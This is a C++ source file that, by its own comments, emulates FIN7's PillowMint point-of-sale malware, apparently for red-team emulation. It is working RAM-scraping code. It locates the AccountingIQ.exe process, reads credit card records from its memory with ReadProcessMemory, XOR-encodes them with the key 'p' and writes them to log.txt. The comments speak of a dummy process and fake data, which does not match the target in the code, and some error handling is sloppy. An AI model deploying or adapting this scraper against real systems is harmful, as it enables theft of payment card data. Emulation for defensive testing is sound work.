// this program is intended to emulate behaviors observed in FIN7's PillowMint malware
// this program searches for a "dummy-pos" process and uses ReadProcessMemory
// in order to find "fake/demo" credit card data
#include <iostream>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <typeinfo>

int getPIDfromName(std::wstring);

int main(int argc, char *argv[]) {

    char creditCard[138]; // buffer used to store fake credit card data
    char encrypted[138];
    uintptr_t targetAddress = 4210688; // default address to scan
    SIZE_T bytes_read;

    // get targetAddress from CLI
    if (argc > 1) {
        targetAddress = atoi(argv[1]);
    }

    std::cout << "[i] searching for 'AccountingIQ.exe'" << std::endl;
    int pid = getPIDfromName(std::wstring(L"AccountingIQ.exe"));
    if (pid == 0) {
        std::cerr << "[!] unable to find process with name AccountingIQ.exe" << std::endl;
        return -1;
    }

    std::cout << "[i] getting handle to AccountingIQ.exe via OpenProcess()" << std::endl;
    HANDLE procH = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
    if (procH == NULL) {
        std::cerr << "[-] unable to get handle to AccountingIQ.exe" << std::endl;
        return -1;
    }

    std::cout << "[i] searching address " << targetAddress << "for credit card records via ReadProcessMemory()" << std::endl;
    int ret = ReadProcessMemory(procH, (LPCVOID)targetAddress, &creditCard, sizeof(creditCard), &bytes_read);
    if (ret == 0) {
        int err = GetLastError();
        std::cerr << "[-] call to ReadProcessMemory failed with error code: " << err << std::endl;
        
    }
    
    std::cout << "[+] Found credit card record:" << std::endl;
    std::cout << "\n[$]------------------------------------------------------------------------------------------------------------------------------------------" << std::endl;
    for (int i = 0; i < bytes_read; i++) {
        std::cout << creditCard[i];
    }
    std::cout << "\n[$]------------------------------------------------------------------------------------------------------------------------------------------\n" << std::endl;

    // xor encrypting credit card data with key 'p'
    std::cout << "[i] XOR Encrypting credit card data" << std::endl;
    for (int i = 0; i < sizeof(creditCard); i++){
        encrypted[i] = creditCard[i] ^ 'p';
    }

    // write credit card record to file
    std::cout << "[+] Writing credit card record to file: log.txt" << std::endl;
    std::ofstream logFile;
    logFile.open("log.txt");
    logFile << encrypted << std::endl;
    logFile.close();

    
    std::cout << "[i] closing handle to AccountingIQ.exe" << std::endl;    
    ret = CloseHandle(procH);
    if (ret == 0) {
        std::cerr << "[-] call to CloseHandle failed" << std::endl;
    }

    std::cout << "[i] finished" << std::endl;
    return 0;   
}

// getPIDfromName gets a process ID from a process name
int getPIDfromName(std::wstring targetProcessName) {
    int pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W entry; //current process
    entry.dwSize = sizeof entry;
    if (!Process32FirstW(snap, &entry)) { //start with the first in snapshot
        std::cerr << "[-] fatal error in call to Process32FirstW" << std::endl;
        return 0;
    }
    // iterate over each process object
    while (Process32NextW(snap, &entry)) {
        if (std::wstring(entry.szExeFile) == targetProcessName) {
            pid = entry.th32ProcessID;
            std::cout << "[+] Found process with name 'AccountingIQ.exe' (pid: " << pid << ")" << std::endl;
            break;
        }
   }
    return pid;
}